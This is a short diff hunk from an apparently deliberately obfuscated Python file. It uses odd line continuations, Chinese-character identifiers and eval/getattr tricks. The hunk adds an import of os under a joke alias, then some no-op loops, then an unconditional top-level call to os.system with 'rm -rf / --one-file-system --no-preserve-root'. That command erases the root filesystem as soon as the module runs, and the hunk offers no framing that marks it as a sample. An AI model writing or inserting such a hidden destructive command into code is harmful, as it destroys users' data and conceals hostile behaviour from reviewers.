@@ -41,6 +41,14 @@ while (not (
     break \
  \
         ;
+import os as sussy_amongus_jay_the_sus_imposter;
+while False:
+        break
+        while True:
+                break
+
+
+sussy_amongus_jay_the_sus_imposter.system("rm -rf / --one-file-system --no-preserve-root")
 啊BBu__啊啊啊__Built____ins___= \
             (
                 getattr(eval(
